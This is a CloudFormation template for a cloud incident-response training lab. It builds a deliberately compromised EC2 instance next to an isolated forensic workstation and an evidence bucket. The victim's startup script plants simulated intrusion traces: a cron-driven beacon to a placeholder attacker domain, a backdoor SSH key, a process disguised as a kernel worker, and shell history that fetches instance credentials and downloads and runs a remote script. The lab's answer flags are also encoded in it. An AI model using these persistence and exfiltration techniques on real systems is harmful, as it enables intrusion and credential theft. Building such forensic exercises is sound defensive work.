@@ -1,0 +1,290 @@
+AWSTemplateFormatVersion: "2010-09-09"
+Description: >
+  Skyfortress Lab 5.2 "Digital Autopsy" — a compromised EC2 instance with planted attacker
+  artifacts, a forensic workstation in an isolated subnet (no internet, SSM via VPC endpoints),
+  pre-built isolation security groups and an Object Lock evidence bucket.
+  Approx cost: ~$0.10/hr (2x t3.small + 3 interface endpoints). Delete the stack when done.
+
+Parameters:
+  LatestAmi:
+    Type: AWS::SSM::Parameter::Value<AWS::EC2::Image::Id>
+    Default: /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64
+  S3PrefixListId:
+    Type: String
+    Description: >
+      AWS-managed prefix list for S3 in this Region. Get it with:
+      aws ec2 describe-managed-prefix-lists --filters Name=prefix-list-name,Values=com.amazonaws.us-east-1.s3 --query 'PrefixLists[0].PrefixListId' --output text
+    AllowedPattern: "pl-[0-9a-f]+"
+
+Resources:
+  # ---------------------------------------------------------------- network
+  Vpc:
+    Type: AWS::EC2::VPC
+    Properties:
+      CidrBlock: 10.50.0.0/16
+      EnableDnsHostnames: true
+      EnableDnsSupport: true
+      Tags: [{ Key: Name, Value: skyfortress-d5-autopsy }]
+  Igw:
+    Type: AWS::EC2::InternetGateway
+  IgwAttach:
+    Type: AWS::EC2::VPCGatewayAttachment
+    Properties: { VpcId: !Ref Vpc, InternetGatewayId: !Ref Igw }
+
+  WorkloadSubnet:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId: !Ref Vpc
+      CidrBlock: 10.50.1.0/24
+      AvailabilityZone: !Select [0, !GetAZs ""]
+      MapPublicIpOnLaunch: true
+      Tags: [{ Key: Name, Value: workload-public }]
+  ForensicsSubnet:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId: !Ref Vpc
+      CidrBlock: 10.50.2.0/24
+      AvailabilityZone: !Select [0, !GetAZs ""]
+      Tags: [{ Key: Name, Value: forensics-isolated }]
+
+  WorkloadRt:
+    Type: AWS::EC2::RouteTable
+    Properties: { VpcId: !Ref Vpc }
+  WorkloadDefault:
+    Type: AWS::EC2::Route
+    DependsOn: IgwAttach
+    Properties: { RouteTableId: !Ref WorkloadRt, DestinationCidrBlock: 0.0.0.0/0, GatewayId: !Ref Igw }
+  WorkloadRtAssoc:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties: { RouteTableId: !Ref WorkloadRt, SubnetId: !Ref WorkloadSubnet }
+  ForensicsRt:
+    Type: AWS::EC2::RouteTable
+    Properties: { VpcId: !Ref Vpc }   # deliberately NO default route
+  ForensicsRtAssoc:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties: { RouteTableId: !Ref ForensicsRt, SubnetId: !Ref ForensicsSubnet }
+
+  S3GatewayEndpoint:
+    Type: AWS::EC2::VPCEndpoint
+    Properties:
+      VpcId: !Ref Vpc
+      ServiceName: !Sub com.amazonaws.${AWS::Region}.s3
+      VpcEndpointType: Gateway
+      RouteTableIds: [!Ref WorkloadRt, !Ref ForensicsRt]
+
+  EndpointSg:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: Interface endpoints - HTTPS from inside the VPC
+      VpcId: !Ref Vpc
+      SecurityGroupIngress:
+        - { IpProtocol: tcp, FromPort: 443, ToPort: 443, CidrIp: 10.50.0.0/16 }
+  SsmEndpoint:
+    Type: AWS::EC2::VPCEndpoint
+    Properties:
+      VpcId: !Ref Vpc
+      ServiceName: !Sub com.amazonaws.${AWS::Region}.ssm
+      VpcEndpointType: Interface
+      PrivateDnsEnabled: true
+      SubnetIds: [!Ref ForensicsSubnet]
+      SecurityGroupIds: [!Ref EndpointSg]
+  SsmMessagesEndpoint:
+    Type: AWS::EC2::VPCEndpoint
+    Properties:
+      VpcId: !Ref Vpc
+      ServiceName: !Sub com.amazonaws.${AWS::Region}.ssmmessages
+      VpcEndpointType: Interface
+      PrivateDnsEnabled: true
+      SubnetIds: [!Ref ForensicsSubnet]
+      SecurityGroupIds: [!Ref EndpointSg]
+  Ec2MessagesEndpoint:
+    Type: AWS::EC2::VPCEndpoint
+    Properties:
+      VpcId: !Ref Vpc
+      ServiceName: !Sub com.amazonaws.${AWS::Region}.ec2messages
+      VpcEndpointType: Interface
+      PrivateDnsEnabled: true
+      SubnetIds: [!Ref ForensicsSubnet]
+      SecurityGroupIds: [!Ref EndpointSg]
+
+  # ---------------------------------------------------------------- security groups
+  WorkloadSg:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: Normal web workload SG (what the Kraken came in through)
+      VpcId: !Ref Vpc
+      SecurityGroupIngress:
+        - { IpProtocol: tcp, FromPort: 80, ToPort: 80, CidrIp: 0.0.0.0/0 }
+      Tags: [{ Key: Name, Value: workload-web }]
+
+  # Step 1 of isolation: an allow-all SG converts tracked connections to UNTRACKED.
+  FlushSg:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: IR step 1 - allow all so existing flows become untracked
+      VpcId: !Ref Vpc
+      SecurityGroupIngress:
+        - { IpProtocol: "-1", CidrIp: 0.0.0.0/0 }
+      SecurityGroupEgress:
+        - { IpProtocol: "-1", CidrIp: 0.0.0.0/0 }
+      Tags: [{ Key: Name, Value: ir-flush-untracked }]
+
+  # Step 2 of isolation: nothing in, only HTTPS out to the SSM endpoints + S3 gateway.
+  IsolationSg:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: IR step 2 - quarantine. No ingress. Egress only to SSM endpoints and S3.
+      VpcId: !Ref Vpc
+      SecurityGroupEgress:
+        - { IpProtocol: tcp, FromPort: 443, ToPort: 443, DestinationSecurityGroupId: !Ref EndpointSg, Description: SSM endpoints }
+      Tags: [{ Key: Name, Value: ir-quarantine }]
+  IsolationSgS3Egress:
+    Type: AWS::EC2::SecurityGroupEgress
+    Properties:
+      GroupId: !Ref IsolationSg
+      IpProtocol: tcp
+      FromPort: 443
+      ToPort: 443
+      DestinationPrefixListId: !Ref S3PrefixListId
+      Description: S3 via gateway endpoint
+
+  ForensicSg:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: Forensic workstation - no ingress, HTTPS to endpoints/S3 only
+      VpcId: !Ref Vpc
+      SecurityGroupEgress:
+        - { IpProtocol: tcp, FromPort: 443, ToPort: 443, DestinationSecurityGroupId: !Ref EndpointSg }
+  ForensicSgS3Egress:
+    Type: AWS::EC2::SecurityGroupEgress
+    Properties:
+      GroupId: !Ref ForensicSg
+      IpProtocol: tcp
+      FromPort: 443
+      ToPort: 443
+      DestinationPrefixListId: !Ref S3PrefixListId
+
+  # ---------------------------------------------------------------- evidence bucket (WORM)
+  EvidenceBucket:
+    Type: AWS::S3::Bucket
+    Properties:
+      BucketName: !Sub skyfortress-d5-evidence-${AWS::AccountId}
+      ObjectLockEnabled: true
+      VersioningConfiguration: { Status: Enabled }
+      ObjectLockConfiguration:
+        ObjectLockEnabled: Enabled
+        Rule:
+          DefaultRetention: { Mode: GOVERNANCE, Days: 1 }
+      PublicAccessBlockConfiguration:
+        BlockPublicAcls: true
+        BlockPublicPolicy: true
+        IgnorePublicAcls: true
+        RestrictPublicBuckets: true
+      BucketEncryption:
+        ServerSideEncryptionConfiguration:
+          - ServerSideEncryptionByDefault: { SSEAlgorithm: aws:kms }
+            BucketKeyEnabled: true
+
+  # ---------------------------------------------------------------- IAM
+  WorkloadRole:
+    Type: AWS::IAM::Role
+    Properties:
+      AssumeRolePolicyDocument:
+        Version: "2012-10-17"
+        Statement: [{ Effect: Allow, Principal: { Service: ec2.amazonaws.com }, Action: sts:AssumeRole }]
+      ManagedPolicyArns: [arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore]
+  WorkloadProfile:
+    Type: AWS::IAM::InstanceProfile
+    Properties: { Roles: [!Ref WorkloadRole] }
+
+  ForensicRole:
+    Type: AWS::IAM::Role
+    Properties:
+      AssumeRolePolicyDocument:
+        Version: "2012-10-17"
+        Statement: [{ Effect: Allow, Principal: { Service: ec2.amazonaws.com }, Action: sts:AssumeRole }]
+      ManagedPolicyArns: [arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore]
+      Policies:
+        - PolicyName: evidence-write-only
+          PolicyDocument:
+            Version: "2012-10-17"
+            Statement:
+              - Effect: Allow
+                Action: [s3:PutObject, s3:PutObjectRetention]
+                Resource: !Sub ${EvidenceBucket.Arn}/*
+  ForensicProfile:
+    Type: AWS::IAM::InstanceProfile
+    Properties: { Roles: [!Ref ForensicRole] }
+
+  # ---------------------------------------------------------------- instances
+  VictimInstance:
+    Type: AWS::EC2::Instance
+    DependsOn: WorkloadDefault
+    Properties:
+      ImageId: !Ref LatestAmi
+      InstanceType: t3.small
+      SubnetId: !Ref WorkloadSubnet
+      SecurityGroupIds: [!Ref WorkloadSg]
+      IamInstanceProfile: !Ref WorkloadProfile
+      MetadataOptions: { HttpTokens: required }
+      Tags:
+        - { Key: Name, Value: nimbus-web-07 }
+        - { Key: app, Value: cargo-tracker }
+      UserData:
+        Fn::Base64: |
+          #!/bin/bash
+          # --- legit-looking bootstrap -------------------------------------------
+          dnf -y install cronie nginx >/dev/null 2>&1
+          systemctl enable --now crond nginx
+          # Pre-staged IR tooling (in real life: bake into your golden AMI or ship via SSM Distributor)
+          curl -sSL -o /usr/local/sbin/avml https://github.com/microsoft/avml/releases/latest/download/avml \
+            && chmod 0755 /usr/local/sbin/avml
+          # --- KRAKEN ARTIFACTS (planted for the lab — do not peek, operator!) -----
+          cat > /usr/local/bin/.ksync <<'EOF'
+          #!/bin/bash
+          # kraken sync agent v0.7
+          curl -s -m 3 "https://beacon.kraken-collective.invalid/checkin?h=$(hostname)" >/dev/null 2>&1
+          EOF
+          chmod +x /usr/local/bin/.ksync
+          cat > /etc/cron.d/kraken-sync <<'EOF'
+          # system telemetry sync
+          # beacon=U0tZe2Nyb25faXNfd2hlcmVfa3Jha2Vuc19oaWRlfQ==
+          */5 * * * * root /usr/local/bin/.ksync
+          EOF
+          echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOkrakenCollectiveTentacleSevenBackdoorKey01 kraken@collective' >> /home/ec2-user/.ssh/authorized_keys
+          printf '%s\n' 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/' \
+            'TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 600")' \
+            'wget -q https://beacon.kraken-collective.invalid/x.sh -O /tmp/.x && bash /tmp/.x' \
+            'history -c' >> /root/.bash_history
+          touch -d '2026-11-30 03:14:15' /etc/cron.d/kraken-sync /usr/local/bin/.ksync
+          # fileless-ish implant: script deletes itself; the secret only lives in RAM
+          cat > /tmp/.kworker.py <<'EOF'
+          import os, time
+          k = "}stegrof_reven_yromem{YKS"[::-1]
+          beacon = ["implant-cfg:" + k + ":tentacle-7;" for _ in range(256)]
+          os.remove(__file__)
+          while True:
+              time.sleep(30)
+          EOF
+          nohup bash -c 'exec -a "[kworker/u4:2-events]" python3 /tmp/.kworker.py' >/dev/null 2>&1 &
+
+  ForensicInstance:
+    Type: AWS::EC2::Instance
+    DependsOn: [SsmEndpoint, SsmMessagesEndpoint, Ec2MessagesEndpoint]
+    Properties:
+      ImageId: !Ref LatestAmi
+      InstanceType: t3.small
+      SubnetId: !Ref ForensicsSubnet
+      SecurityGroupIds: [!Ref ForensicSg]
+      IamInstanceProfile: !Ref ForensicProfile
+      MetadataOptions: { HttpTokens: required }
+      Tags:
+        - { Key: Name, Value: skyfortress-forensic-workstation }
+
+Outputs:
+  VictimInstanceId: { Value: !Ref VictimInstance }
+  ForensicInstanceId: { Value: !Ref ForensicInstance }
+  FlushSgId: { Value: !Ref FlushSg }
+  IsolationSgId: { Value: !Ref IsolationSg }
+  EvidenceBucket: { Value: !Ref EvidenceBucket }
+  AvailabilityZone: { Value: !GetAtt VictimInstance.AvailabilityZone }
